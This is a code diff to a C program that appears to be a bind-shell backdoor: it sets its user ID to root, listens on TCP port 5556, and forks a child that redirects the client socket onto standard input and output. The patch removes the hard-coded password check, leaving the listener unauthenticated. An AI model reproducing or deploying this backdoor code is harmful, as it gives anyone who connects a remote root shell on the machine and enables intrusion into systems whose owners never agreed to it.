@@ -37,14 +37,9 @@
 #define STDIN 0
 #define STDOUT 1
 #define PORT 5556
-#define MAXBUF 50
 
 typedef struct sockaddr_in SockAddrIn;
 typedef struct sockaddr SockAddr;
-
-static char *passwd = "hihiohayou";
-static char *wel = "Welcome!\n";
-static char *acdeny = "Access Deny!\n";
 
 int main(int argc, char **argv)
 {
@@ -52,7 +47,6 @@ int main(int argc, char **argv)
     int pid, res, addrlen;
     void *pStdOut;
     SockAddrIn scSockServer, scSockClient;
-    char strBuf[MAXBUF];
 
     setreuid(0, 0);
 
@@ -62,24 +56,18 @@ int main(int argc, char **argv)
     scSockServer.sin_port = htons(PORT);
 
     addrlen = sizeof(scSockClient);
-    
-		
-	sockfd = socket(AF_INET, SOCK_STREAM, 0);
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
-	if (sockfd == -1) {
-		printf("[E]: Can not create socket\n");
-		return -1;
-	}
+    if (sockfd == -1) {
+        printf("[E]: Can not create socket\n");
+        return -1;
+    }
 
-	if (bind(sockfd, (SockAddr *)(&scSockServer), sizeof(SockAddr)) == -1) {
-		printf("[E]: Error when bind socket [%d] [%s]\n", errno, strerror(errno));
-		return -2;
-	}
-		
-	if (listen(sockfd, SOMAXCONN) == -1) {
-		printf("[E]: Error When listen\n");
-		return -3;
-	}
+    if (bind(sockfd, (SockAddr *)(&scSockServer), sizeof(SockAddr)) == -1) {
+        printf("[E]: Error when bind socket [%d] [%s]\n", errno, strerror(errno));
+        return -2;
+    }
+
     /*************************************
      * Just For Test I/O Redirect
      *************************************/
@@ -92,20 +80,17 @@ int main(int argc, char **argv)
         return -2;
     }
     */
-    while (1) {		
+    if (listen(sockfd, SOMAXCONN) == -1) {
+        printf("[E]: Error When listen\n");
+        return -3;
+    }
+
+    while (1) {
         if ((cliSockfd = accept(sockfd, (SockAddr *)(&scSockClient), &addrlen)) == -1) {
             printf("[E]: Error When accept\n");
             return -4;
         }
-
-        read(cliSockfd, strBuf, MAXBUF);
-        if (strncmp(strBuf, passwd, strlen(passwd)) != 0) {
-            write(cliSockfd, acdeny, strlen(acdeny));
-            close(cliSockfd);
-            continue;
-        }
-        write(cliSockfd, wel, strlen(wel));
-
+    
         if (!(pid = fork())) {
             if ((in = dup2(cliSockfd, STDIN)) == -1) {//标准输出重定向到客户机socket
                 printf("[E]: Error When change stdin to socket\n");
